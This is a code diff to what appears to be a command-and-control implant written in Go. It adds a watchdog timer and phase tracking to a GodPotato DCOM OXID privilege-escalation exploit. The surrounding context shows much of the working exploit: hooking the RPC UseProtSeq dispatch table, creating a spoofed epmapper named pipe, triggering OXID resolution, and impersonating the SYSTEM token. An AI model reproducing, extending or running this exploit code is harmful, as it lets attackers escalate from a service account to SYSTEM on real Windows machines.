@@ -10,6 +10,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"syscall"
 	"time"
 	"unsafe"
@@ -256,9 +257,35 @@ func createHookCallback(paramCount int) (uintptr, error) {
 	}
 }
 
-// getSystemViaPotato implements the GodPotato DCOM OXID resolution exploit.
+// getSystemViaPotato wraps the DCOM OXID exploit with a watchdog timer.
+// If the exploit hangs (e.g., COM call deadlock), the watchdog returns
+// diagnostic output indicating which phase was reached.
 func getSystemViaPotato(oldIdentity string) structs.CommandResult {
+	var phase int32
+	resultCh := make(chan structs.CommandResult, 1)
+
+	go func() {
+		resultCh <- doPotatoExploit(oldIdentity, &phase)
+	}()
+
+	select {
+	case result := <-resultCh:
+		return result
+	case <-time.After(25 * time.Second):
+		return structs.CommandResult{
+			Output: fmt.Sprintf("Potato technique timed out (25s watchdog).\nLast phase: %d\nhookCalled: %v\nparamCount: %d\npipe: %s",
+				atomic.LoadInt32(&phase), potatoGlobal.hookCalled, potatoGlobal.paramCount, potatoGlobal.pipeName),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+}
+
+// doPotatoExploit implements the actual GodPotato DCOM OXID resolution exploit.
+// The phase counter is updated atomically so the watchdog can report progress.
+func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	// Phase 0: Check SeImpersonatePrivilege
+	atomic.StoreInt32(phase, 0)
 	if !checkPrivilege("SeImpersonatePrivilege") {
 		return structs.CommandResult{
 			Output:    "SeImpersonatePrivilege not available. This technique requires a service account (NETWORK SERVICE, LOCAL SERVICE, IIS, MSSQL, etc.).",
@@ -273,6 +300,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	defer runtime.UnlockOSThread()
 
 	// Phase 1: Initialize COM (loads combase.dll) and scan for ORCB RPC interface
+	atomic.StoreInt32(phase, 1)
 	procCoInitializeEx.Call(0, 0) // COINIT_MULTITHREADED = 0
 	defer procCoUninitialize.Call()
 
@@ -295,6 +323,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 
 	// Phase 2: Parse RPC structures and locate UseProtSeq dispatch entry
+	atomic.StoreInt32(phase, 2)
 	rpcIface := (*rpcServerInterface)(unsafe.Pointer(rpcIfaceAddr))
 	if rpcIface.DispatchTable == 0 {
 		return structs.CommandResult{
@@ -340,6 +369,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	potatoGlobal.origFuncPtr = origFunc
 
 	// Phase 3: Extract our process's OXID BEFORE installing the hook.
+	atomic.StoreInt32(phase, 3)
 	// CreateObjrefMoniker triggers OXID registration which may call UseProtSeq.
 	// We must do this with the original (unhooked) dispatch to avoid deadlocks.
 	oxid, oid, ipid, oxidErr := extractProcessOXID()
@@ -352,6 +382,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 
 	// Phase 4: Create named pipe server
+	atomic.StoreInt32(phase, 4)
 	pipeUniqueName := fmt.Sprintf("fawkes_%d", time.Now().UnixNano()%100000)
 	pipeName := fmt.Sprintf(`\\.\pipe\%s\pipe\epmapper`, pipeUniqueName)
 	potatoGlobal.pipeName = pipeName
@@ -414,6 +445,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 
 	// Phase 5: Create hook callback with correct parameter count and install
+	atomic.StoreInt32(phase, 5)
 	hookCallback, hookErr := createHookCallback(paramCount)
 	if hookErr != nil {
 		return structs.CommandResult{
@@ -444,6 +476,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}()
 
 	// Phase 6: Trigger OXID resolution via crafted OBJREF.
+	atomic.StoreInt32(phase, 6)
 	// Run in a goroutine because CoUnmarshalInterface can block if RPCSS hangs.
 	// The trigger goroutine needs its own COM initialization and thread pinning.
 	triggerDone := make(chan error, 1)
@@ -465,6 +498,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 
 	// Phase 7: Wait for pipe connection (SYSTEM connecting)
+	atomic.StoreInt32(phase, 7)
 	waitResult, _ := windows.WaitForSingleObject(event, 10000) // 10s timeout
 	if waitResult != windows.WAIT_OBJECT_0 {
 		hookStatus := "NOT called"
@@ -485,6 +519,7 @@ func getSystemViaPotato(oldIdentity string) structs.CommandResult {
 	}
 
 	// Phase 8: Impersonate the SYSTEM token
+	atomic.StoreInt32(phase, 8)
 	ret, _, impErr := procImpersonateNamedPipeClient.Call(hPipe)
 	if ret == 0 {
 		procDisconnectNamedPipe.Call(hPipe)
